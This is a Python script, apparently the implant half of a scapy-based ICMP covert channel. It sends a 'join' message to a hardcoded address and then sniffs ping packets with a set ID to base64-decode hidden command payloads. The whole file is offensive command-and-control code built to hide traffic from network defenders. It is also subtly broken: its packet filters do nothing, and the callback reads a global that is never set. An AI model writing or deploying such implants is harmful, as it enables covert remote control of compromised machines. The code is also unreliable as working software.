#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import os
import socket
import psutil
import pwd
import base64
from shelly import Host, Target

ICMP_ID = int(12800)
TTL = int(64)

target = None

class Implant(Host):
    
    def __init__(self):
        super().__init__()
        self.type = "implant"

    def sniff_callback(self, packet):
        global target
        
        if packet[IP].src != target.ip:
            pass
        elif packet[ICMP].type != 8:
            pass
        elif packet[ICMP].id != ICMP_ID:
            pass
        elif not packet[Raw].load:
            pass

        encoded_shellpack = (packet[Raw].load).decode('utf-8', errors='ignore')
        shellpack = base64.b64decode(encoded_shellpack)
        print(shellpack)

def setup_implant() -> Implant:
    print("[ Setting up implant... ]")
    implant = Implant()
    print(implant)
    
    # Send join command
    target = Target("192.168.157.6")
    shellpack = implant.build_shellpack(command="join")
    target.send(shellpack) 

    return implant

if __name__ == "__main__":
    implant = setup_implant()
    print("[ ICMP Sniffing Started ]")
    sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
